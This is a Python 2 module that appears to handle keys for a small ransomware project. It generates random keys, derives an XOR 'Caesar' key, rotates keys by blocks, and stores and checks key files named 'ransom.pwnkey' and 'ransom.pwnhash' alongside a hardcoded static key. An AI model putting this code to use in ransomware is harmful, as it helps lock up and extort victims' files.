import hashlib

import os

from file_util import put_file, get_file
from cipher.reverse import ReverseCipher

STATIC_KEY = "6l72xhpwZ9P3RjTHUi8vuq2hHP0dlaSz"

SYMBOLS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='

KEY_FILE = "ransom.pwnkey"

KEY_HASH_FILE = "ransom.pwnhash"


def get_md5(string):
    md5 = hashlib.md5()
    md5.update(string)

    return md5


def create_key():
    """Generate key"""
    return Key.from_string(os.urandom(32))


def caeser_key(key):
    new_key = 0
    for c in key.ints:
        new_key = new_key ^ c
    return new_key


def get_key_file(root_dir):
    key_file_path = os.path.join(root_dir, KEY_FILE)
    hash_file_path = os.path.join(root_dir, KEY_HASH_FILE)

    if not os.path.exists(key_file_path):
        raise Exception('No key file found, cannot decrypt.')

    if not os.path.exists(hash_file_path):
        raise Exception('No hash file found, cannot decrypt.')

    key = Key.from_string(get_file(key_file_path))
    stored_hash = get_file(hash_file_path)

    if key.md5 != stored_hash:
        raise Exception('Incorrect key, cannot decrypt.')

    os.remove(key_file_path)
    os.remove(hash_file_path)

    return key


def export_key_file(root_dir, key):
    put_file(os.path.join(root_dir, KEY_FILE), key.string)
    put_file(os.path.join(root_dir, KEY_HASH_FILE), key.md5)


def rotate_key(key, block):
    block_ints = map(ord, block)

    if len(block_ints) >= len(key.ints):
        return Key.from_ints(block_ints[:len(key.ints)])
    else:
        new_key_ints = key.ints[len(block_ints):] + block_ints

        return Key.from_ints(new_key_ints)


class Key:

    def __init__(self, string, ints):
        self.string = string
        self.ints = ints
        self.md5 = get_md5(string).hexdigest()

    @classmethod
    def from_string(cls, string):
        return cls(string, map(ord, string))

    @classmethod
    def from_ints(cls, ints):
        return cls(''.join(map(chr, ints)), ints)
